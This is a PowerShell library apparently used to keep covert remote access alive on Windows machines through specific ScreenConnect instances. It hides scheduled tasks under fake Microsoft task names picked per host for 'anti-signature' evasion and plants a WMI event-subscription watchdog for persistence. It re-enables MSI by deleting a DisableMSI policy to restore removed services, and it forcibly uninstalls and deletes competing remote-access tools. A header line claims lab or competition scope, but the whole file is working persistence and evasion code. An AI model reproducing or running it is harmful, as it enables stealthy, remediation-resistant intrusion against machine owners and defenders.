#Requires -Version 5.1
# ═══════════════════════════════════════════════════════════════
# OWN_LIB  BUILD 20260802L5
# Shared library: per-host identity (anti-signature), WMI watchdog
# (mutual persistence chain), campaign state file, SC service repair.
# L2: safe task-name pools (parents exist on all Win10/11), IDENTVER
# regeneration, -Action repair recreates deleted SC services via
# msiexec /fa {GUID} (never triggers SC-family major-upgrade removal).
# L3: -Action exterminate - true removal engine for foreign ScreenConnect
# (MSI uninstall + svc/proc/dir kill) and disallowed RMM tools.
# Authorized internal deployment - lab/competition scope only.
# ═══════════════════════════════════════════════════════════════
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'state', 'identity', 'repair', 'registered', 'exterminate')]
    [string]$Action,
    [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
    [string]$MonPath = '',
    [string]$Build  = 'O15',
    [string]$Extra  = '',
    [string]$Fp     = ''
)

$ErrorActionPreference = 'SilentlyContinue'
$cfgPath = Join-Path $WorkDir 'identity.cfg'
$IdentVersion = 3

# Legit-looking task-name pools; per-host hash picks one per slot.
# v2: ONLY parent folders that exist on every Win10/11 (WwanSvc/MemoryDiagnostic/
# PowerEfficiency/DiskDiagnostic parents are absent on some machines -> /Create failed).
$Pools = @{
    A = @('\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\Diagnosis\SRTask')
    B = @('\Microsoft\Windows\PLA\Server','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\Tcpip\IpAddressConflict2','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Diagnosis\SRTask')
    C = @('\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Diagnosis\SRTask')
    D = @('\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Diagnosis\SRTask')
}
$Defaults = [ordered]@{
    TASK_A = '\Microsoft\Windows\Diagnosis\Scheduled'
    TASK_B = '\Microsoft\Windows\PLA\Server'
    TASK_C = '\Microsoft\Windows\WDI\ResolutionHost'
    TASK_D = '\Microsoft\Windows\Tcpip\IpAddressConflict1'
    MO_A   = '2'
    MO_B   = '3'
}

function Get-HostSeed {
    $s = 0L
    foreach ($c in $env:COMPUTERNAME.ToUpper().ToCharArray()) { $s = ($s * 31 + [int]$c) % 1000000007 }
    return $s
}

function Read-Identity {
    $id = $Defaults.Clone()
    if (Test-Path $cfgPath) {
        foreach ($line in (Get-Content -LiteralPath $cfgPath -Force)) {
            if ($line -match '^\s*([A-Z_]+)\s*=\s*(.+?)\s*$') { $id[$matches[1]] = $matches[2] }
        }
    }
    return $id
}

function Remove-TaskQuiet([string]$tn) {
    if ($tn) { & schtasks.exe /Delete /TN $tn /F 2>&1 | Out-Null }
}

function Initialize-Identity {
    # Idempotent within an IDENTVER generation. Pool upgrades bump IDENTVER:
    # old-name tasks are deleted, then identity is regenerated from the same seed.
    if (Test-Path $cfgPath) {
        $old = Read-Identity
        if ($old['IDENTVER'] -eq "$IdentVersion") { return $old }
        foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') { Remove-TaskQuiet $old[$k] }
        Remove-Item -LiteralPath $cfgPath -Force
    }
    $s = Get-HostSeed
    # L4: two slots may hash to the same task path (pools share names) ->
    # one physical task then satisfies two slots and the fleet shows 3/4.
    # Walk each pool forward until the pick is unique across slots.
    $pick = [ordered]@{}
    foreach ($slot in @(@('A', $s % 8), @('B', ($s + 3) % 8), @('C', ($s + 5) % 8), @('D', ($s + 7) % 8))) {
        $letter = [string]$slot[0]; $i = [int]$slot[1]
        $name = $Pools[$letter][$i]
        $n = 0
        while ($pick.Values -contains $name -and $n -lt 8) { $i = ($i + 1) % 8; $name = $Pools[$letter][$i]; $n++ }
        $pick[$letter] = $name
    }
    $cfg = @(
        "TASK_A=$($pick.A)"
        "TASK_B=$($pick.B)"
        "TASK_C=$($pick.C)"
        "TASK_D=$($pick.D)"
        "MO_A=$(2 + ($s % 4))"          # 2-5 min jitter
        "MO_B=$(3 + (($s + 1) % 3))"    # 3-5 min jitter
        "SEED=$s"
        "IDENTVER=$IdentVersion"
    )
    Set-Content -LiteralPath $cfgPath -Value $cfg -Force
    return (Read-Identity)
}

function Install-Watchdog {
    if (-not $MonPath) { return $false }
    $ok = $true
    try {
        Set-WmiInstance -Namespace root\subscription -Class __IntervalTimerInstruction `
            -Arguments @{ TimerId = 'WucacheWatchdog'; IntervalMilliseconds = 180000; SkipIfPassed = $false } | Out-Null
        $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
            -Arguments @{ Name = 'WucacheWatchdogF'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL';
                          Query = "SELECT * FROM __TimerEvent WHERE TimerId='WucacheWatchdog'" }
        $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
            -Arguments @{ Name = 'WucacheWatchdogC'; CommandLineTemplate = "cmd.exe /c `"$MonPath`""; RunInteractively = $false }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
            -Arguments @{ Filter = $f; Consumer = $c } | Out-Null
    } catch { $ok = $false }
    return $ok
}

function Ensure-Watchdog {
    $c = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WucacheWatchdogC'"
    if ($null -eq $c) {
        Install-Watchdog | Out-Null
        return 'REARMED'
    }
    return 'OK'
}

function Test-SCRegistered([string]$Fingerprint) {
    if (-not $Fingerprint) { return 'no' }
    $name = "ScreenConnect Client ($Fingerprint)"
    foreach ($root in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                      'HKLM:\SOFTWARE\WOW6432Node\CurrentVersion\Uninstall') {
        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = (Get-ItemProperty $_.PSPath).DisplayName
            if ($dn -and $dn -like "*$name*" -and $_.PSChildName -like '{*}') { return 'yes' }
        }
    }
    return 'no'
}

function Repair-SCService([string]$Fingerprint) {
    # Recreates a deleted SC service entry by repairing the REGISTERED product.
    # msiexec /fa {GUID} repairs in place - it does NOT run the SC-family
    # major-upgrade removal, so other instances are untouched.
    # L5: also handles present-but-STOPPED services (repair restores binaries,
    # then start). Only a Running service is considered healthy.
    if (-not $Fingerprint) { return 'no-fp' }
    $name = "ScreenConnect Client ($Fingerprint)"
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq 'Running') { return 'svc-running' }
    $guid = $null
    foreach ($root in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                      'HKLM:\SOFTWARE\WOW6432Node\CurrentVersion\Uninstall') {
        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = (Get-ItemProperty $_.PSPath).DisplayName
            if ($dn -and $dn -like "*$name*" -and $_.PSChildName -like '{*}') { $guid = $_.PSChildName }
        }
    }
    if (-not $guid) { return 'not-registered' }
    & reg.exe delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /f 2>&1 | Out-Null
    & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
    $log = Join-Path $WorkDir "msi_repair_$Fingerprint.log"
    $p = Start-Process msiexec.exe -ArgumentList "/fa $guid /qn /norestart /L*v `"$log`"" -Wait -PassThru
    Start-Sleep -Seconds 8
    & sc.exe config "$name" start= auto 2>&1 | Out-Null
    & sc.exe start "$name" 2>&1 | Out-Null
    Start-Sleep -Seconds 4
    $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq 'Running') { return "svc-restored exit=$($p.ExitCode)" }
    if ($svc) { return "svc-still-stopped exit=$($p.ExitCode)" }
    return "svc-still-missing exit=$($p.ExitCode)"
}

function Invoke-Exterminate {
    # True removal of everything remote-access except the two allowlisted
    # ScreenConnect instances. Order matters: products first (clean MSI
    # uninstall), then services, processes, and leftover dirs.
    $log = Join-Path $WorkDir 'exterminate.log'
    $keep = @('5f6010579852e507','f861c8140d453427')
    $n = @{ svc = 0; proc = 0; dir = 0; product = 0; rmm = 0 }
    function Log([string]$m) { Add-Content -LiteralPath $log -Value ("{0} {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m) -ErrorAction SilentlyContinue }
    function Is-Keeper([string]$s) { foreach ($k in $keep) { if ($s -like "*$k*") { return $true } }; return $false }

    # 1. foreign SC products: true MSI uninstall (stops/removes cleanly)
    foreach ($root in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                      'HKLM:\SOFTWARE\WOW6432Node\CurrentVersion\Uninstall') {
        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
            $dn = (Get-ItemProperty $_.PSPath).DisplayName
            if ($dn -and $dn -match 'ScreenConnect Client \(([0-9a-f]{16})\)' -and -not (Is-Keeper $dn) -and $_.PSChildName -like '{*}') {
                $p = Start-Process msiexec.exe -ArgumentList "/x $($_.PSChildName) /qn /norestart" -Wait -PassThru
                $n.product++; Log "product_uninstalled [$dn] exit=$($p.ExitCode)"
            }
        }
    }

    # 2. foreign SC services (leftover entries after uninstall, or unregistered)
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
        if (-not (Is-Keeper $svc.Name)) {
            & sc.exe stop "$($svc.Name)" 2>&1 | Out-Null
            Start-Sleep -Milliseconds 800
            & sc.exe delete "$($svc.Name)" 2>&1 | Out-Null
            $n.svc++; Log "svc_deleted $($svc.Name)"
        }
    }

    # 3. foreign SC processes by executable path
    Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
        $exe = $_.ExecutablePath
        if ($exe -and -not (Is-Keeper $exe)) {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
            $n.proc++; Log "proc_killed $exe"
        }
    }

    # 4. foreign SC install dirs
    foreach ($base in @($env:ProgramFiles, ${env:ProgramFiles(x86)})) {
        if (-not $base -or -not (Test-Path $base)) { continue }
        Get-ChildItem -LiteralPath $base -Directory -Filter 'ScreenConnect*' -ErrorAction SilentlyContinue | ForEach-Object {
            $d = $_.FullName
            if (-not (Is-Keeper $d)) {
                Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue |
                    Where-Object { $_.ExecutablePath -like "$d*" } |
                    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                & takeown.exe /F $d /R /D Y 2>&1 | Out-Null
                & icacls.exe $d /grant 'Administrators:F' /T /C 2>&1 | Out-Null
                Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
                if (Test-Path $d) { Start-Sleep -Seconds 2; Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue }
                if (Test-Path $d) { Log "dir_REMOVE_FAILED $d" } else { $n.dir++; Log "dir_removed $d" }
            }
        }
    }

    # 5. disallowed RMM tools: products, services, processes, dirs
    $rmm = @(
        @{ Tag='AnyDesk';     Svc=@('AnyDesk'); Proc=@('AnyDesk'); Dirs=@("$env:ProgramFiles\AnyDesk","${env:ProgramFiles(x86)}\AnyDesk","$env:ProgramData\AnyDesk"); Prod=@('AnyDesk*') }
        @{ Tag='TeamViewer';  Svc=@('TeamViewer*'); Proc=@('TeamViewer*'); Dirs=@("$env:ProgramFiles\TeamViewer","${env:ProgramFiles(x86)}\TeamViewer"); Prod=@('TeamViewer*') }
        @{ Tag='MeshAgent';   Svc=@('Mesh Agent','MeshAgent','MeshCentral*'); Proc=@('MeshAgent*','MeshCentral*'); Dirs=@("$env:ProgramFiles\Mesh Agent","${env:ProgramFiles(x86)}\Mesh Agent"); Prod=@('Mesh*Agent*') }
        @{ Tag='Splashtop';   Svc=@('Splashtop*','SRService','SSUService'); Proc=@('Splashtop*','strwinclt*','SRManager*'); Dirs=@("$env:ProgramFiles\Splashtop","${env:ProgramFiles(x86)}\Splashtop"); Prod=@('Splashtop*') }
        @{ Tag='LogMeIn';     Svc=@('LogMeIn','LMIGuardianSvc','LMIignition'); Proc=@('LogMeIn*','LMIGuardian*','RaServer*'); Dirs=@("$env:ProgramFiles\LogMeIn","${env:ProgramFiles(x86)}\LogMeIn"); Prod=@('LogMeIn*') }
        @{ Tag='GoTo';        Svc=@('GoToMyPC*','GoToAssist*','GoToResolve*'); Proc=@('GoToMyPC*','GoToAssist*','g2m*','GoToResolve*'); Dirs=@("$env:ProgramFiles\GoToMyPC","${env:ProgramFiles(x86)}\GoToMyPC","$env:ProgramFiles\GoToAssist*","${env:ProgramFiles(x86)}\GoToAssist*"); Prod=@('GoToMyPC*','GoToAssist*') }
        @{ Tag='ConnectWise'; Svc=@('LTService','LTSvcMon'); Proc=@('LTSvc*','LTTray*'); Dirs=@("$env:windir\LTSvc"); Prod=@('ConnectWise*','LabTech*') }
        @{ Tag='Atera';       Svc=@('AteraAgent'); Proc=@('AteraAgent*'); Dirs=@("$env:ProgramFiles\ATERA Networks","${env:ProgramFiles(x86)}\ATERA Networks"); Prod=@('Atera*') }
        @{ Tag='NinjaRMM';    Svc=@('NinjaRMMAgent','ninjarmm*'); Proc=@('NinjaRMMAgent*','ninjarmm*'); Dirs=@("$env:ProgramFiles\NinjaRMMAgent","${env:ProgramFiles(x86)}\NinjaRMMAgent","$env:ProgramData\NinjaRMMAgent"); Prod=@('NinjaRMM*') }
        @{ Tag='Datto';       Svc=@('CentraStage','CagService'); Proc=@('CentraStage*','DattoRMM*'); Dirs=@("$env:ProgramFiles\CentraStage","${env:ProgramFiles(x86)}\CentraStage"); Prod=@('Datto*','CentraStage*') }
        @{ Tag='RustDesk';    Svc=@('RustDesk','rustdesk*'); Proc=@('rustdesk*'); Dirs=@("$env:ProgramFiles\RustDesk","${env:ProgramFiles(x86)}\RustDesk","$env:APPDATA\RustDesk"); Prod=@('RustDesk*') }
        @{ Tag='Supremo';     Svc=@('Supremo*'); Proc=@('Supremo*'); Dirs=@("$env:ProgramFiles\Supremo","${env:ProgramFiles(x86)}\Supremo"); Prod=@('Supremo*') }
        @{ Tag='DWService';   Svc=@('DWAgent','dwagent*'); Proc=@('dwagent*'); Dirs=@("$env:ProgramFiles\DWAgent","${env:ProgramFiles(x86)}\DWAgent","$env:ProgramData\DWAgent"); Prod=@('DWAgent*') }
        @{ Tag='ZohoAssist';  Svc=@('ZohoAssist*','ZohoMeeting*'); Proc=@('ZohoAssist*','ZohoURSB*'); Dirs=@("$env:ProgramFiles\ZohoMeeting","${env:ProgramFiles(x86)}\ZohoMeeting"); Prod=@('Zoho Assist*') }
        @{ Tag='RemotePC';    Svc=@('RemotePC*'); Proc=@('RemotePC*','RPCSuite*'); Dirs=@("$env:ProgramFiles\RemotePC","${env:ProgramFiles(x86)}\RemotePC"); Prod=@('RemotePC*') }
    )
    foreach ($tool in $rmm) {
        $hit = $false
        foreach ($pat in $tool.Prod) {
            foreach ($root in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                              'HKLM:\SOFTWARE\WOW6432Node\CurrentVersion\Uninstall') {
                Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
                    $dn = (Get-ItemProperty $_.PSPath).DisplayName
                    if ($dn -and $dn -like $pat -and $_.PSChildName -like '{*}') {
                        $p = Start-Process msiexec.exe -ArgumentList "/x $($_.PSChildName) /qn /norestart" -Wait -PassThru
                        $n.rmm++; $hit = $true; Log "rmm_product_uninstalled [$dn] exit=$($p.ExitCode)"
                    }
                }
            }
        }
        foreach ($pat in $tool.Svc) {
            Get-Service -Name $pat -ErrorAction SilentlyContinue | ForEach-Object {
                & sc.exe stop "$($_.Name)" 2>&1 | Out-Null
                Start-Sleep -Milliseconds 800
                & sc.exe delete "$($_.Name)" 2>&1 | Out-Null
                $n.rmm++; $hit = $true; Log "rmm_svc_deleted $($_.Name) [$($tool.Tag)]"
            }
        }
        foreach ($pat in $tool.Proc) {
            Get-Process -Name $pat -ErrorAction SilentlyContinue | ForEach-Object {
                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
                $n.rmm++; $hit = $true; Log "rmm_proc_killed $($_.ProcessName) [$($tool.Tag)]"
            }
        }
        foreach ($d in $tool.Dirs) {
            if ($d -and (Test-Path $d)) {
                Get-CimInstance Win32_Process -ErrorAction SilentlyContinue |
                    Where-Object { $_.ExecutablePath -and $_.ExecutablePath.StartsWith($d) } |
                    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                & takeown.exe /F $d /R /D Y 2>&1 | Out-Null
                & icacls.exe $d /grant 'Administrators:F' /T /C 2>&1 | Out-Null
                Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
                if (Test-Path $d) { Start-Sleep -Seconds 2; Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue }
                if (Test-Path $d) { Log "rmm_dir_REMOVE_FAILED $d" } else { $n.rmm++; $hit = $true; Log "rmm_dir_removed $d" }
            }
        }
        if ($hit) { Log "rmm_exterminated $($tool.Tag)" }
    }

    return "exterminate svc=$($n.svc) proc=$($n.proc) dir=$($n.dir) product=$($n.product) rmm=$($n.rmm)"
}

function Update-State {
    $prim = $null; $alt = $null
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
            if ($matches[1] -eq '5f6010579852e507') { $prim = "$($svc.Status)" }
            elseif ($matches[1] -eq 'f861c8140d453427') { $alt = "$($svc.Status)" }
        }
    }
    $foreign = @()
    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*')) {
        if ($svc.Name -match '\(([0-9a-f]{16})\)' -and $matches[1] -notin @('5f6010579852e507','f861c8140d453427')) {
            $foreign += $matches[1]
        }
    }
    $id = Read-Identity
    $tasksOk = 0; $tasksTotal = 0
    foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
        $tasksTotal++
        & schtasks.exe /Query /TN $id[$k] 2>&1 | Out-Null
        if ($LASTEXITCODE -eq 0) { $tasksOk++ }
    }
    $wd = Ensure-Watchdog
    $prev = @{}
    $statePath = Join-Path $WorkDir 'state.json'
    if (Test-Path $statePath) {
        try { (Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json).PSObject.Properties | ForEach-Object { $prev[$_.Name] = $_.Value } } catch {}
    }
    $installCount = 1
    if ($prev.installCount) { $installCount = [int]$prev.installCount }
    if ($prev.prim -and $prev.prim -ne 'Running' -and $prim -eq 'Running') { $installCount++ }
    $state = [ordered]@{
        host         = $env:COMPUTERNAME
        ts           = (Get-Date).ToUniversalTime().ToString('o')
        build        = $Build
        prim         = $(if ($prim) { $prim } else { 'MISSING' })
        alt          = $(if ($alt) { $alt } else { 'MISSING' })
        foreign      = $foreign
        tasksOk      = $tasksOk
        tasksTotal   = $tasksTotal
        watchdog     = $wd
        installCount = $installCount
        lastHeal     = $(if ($Extra) { (Get-Date).ToUniversalTime().ToString('o') } elseif ($prev.lastHeal) { $prev.lastHeal } else { $null })
        note         = $Extra
    }
    ($state | ConvertTo-Json -Compress) | Set-Content -LiteralPath $statePath -Force
    return $state
}

switch ($Action) {
    'init'            { $id = Initialize-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'identity'        { $id = Read-Identity; $id.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" } }
    'watchdog'        { Install-Watchdog | Out-Null }
    'watchdog-ensure' { Ensure-Watchdog }
    'state'           { Update-State | ConvertTo-Json -Compress }
    'repair'          { Repair-SCService $Fp }
    'registered'      { Test-SCRegistered $Fp }
    'exterminate'     { Invoke-Exterminate }
}
